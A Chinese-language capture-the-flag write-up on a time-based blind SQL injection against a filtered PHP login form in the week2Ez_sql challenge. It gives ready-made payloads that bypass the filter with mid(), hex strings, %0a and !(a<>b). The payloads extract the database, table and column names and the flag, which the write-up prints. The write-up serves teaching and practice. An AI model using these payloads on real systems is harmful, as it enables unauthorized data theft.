# week2Ez_sql

## 题目简述

登录接口把 `username` 直接拼入 SQL，页面始终重定向且没有查询回显，因此需要时间盲注。过滤器拦截空格、等号和 `and`、`union`、`substr`、`ctf` 等关键字，但可用括号、`mid()`、十六进制字符串和逻辑等价式绕过。

## 解题过程

源码最终执行：

```php
select * from 0xgame where user='{$username}' and passwd='{$password}';
```

在 `username` 中闭合单引号，以 `||sleep(if(...,2,0))#` 构造时间侧信道。空格用括号或 URL 解码后的换行 `%0a` 代替；被禁用的 `substr` 改为同义函数 `mid`；数据库名 `ctf` 写成十六进制 `0x637466`；等值判断写成 `!(a<>b)`。

下面的 `{pos}` 和 `{guess}` 分别表示字符位置和二分猜测值。查库名：

POC，查库名：

~~~sql
1'||sleep(if(1^(ord(mid((select(database())),{pos},1))>{guess}),2,0))#
~~~

查表名：

~~~sql
1'||sleep(if(1^(ord(mid((select(table_name)from(information_schema.tables)where!(table_schema<>0x637466)limit%0a1,1),{pos},1))>{guess}),2,0))#
~~~

查列名：

~~~sql
1'||sleep(if(1^(ord(mid((select(column_name)from(information_schema.columns)where!(table_name<>'secret')limit%0a{row},1),{pos},1))>{guess}),2,0))#
~~~

查 flag：

~~~sql
1'||sleep(if(1^(ord(mid((select(ffflllaaag)from(secret)),{pos},1))>{guess}),2,0))#
~~~

对每个位置在可打印 ASCII 范围内二分 `{guess}`，根据响应是否延迟约 2 秒更新上下界。枚举得到表 `secret`，其中真实 flag 列为 `ffflllaaag`，最终内容是：

```text
0xGame{Y0u_kn0w_the_sq1_Inj3ction}
```

## 方法总结

- 核心方法：在无回显登录点构造基于 `sleep` 的布尔时间盲注，并用二分法逐字符提取元数据和 flag。
- 识别特征：单引号能影响响应耗时，SQL 字符串由用户输入直接拼接，但页面内容不反映真假分支。
- 注意事项：不能继续使用已被过滤的 `substr`；应设置多次采样和合理超时区分网络抖动，且 `%0a` 是否在过滤前解码要以实际请求验证。
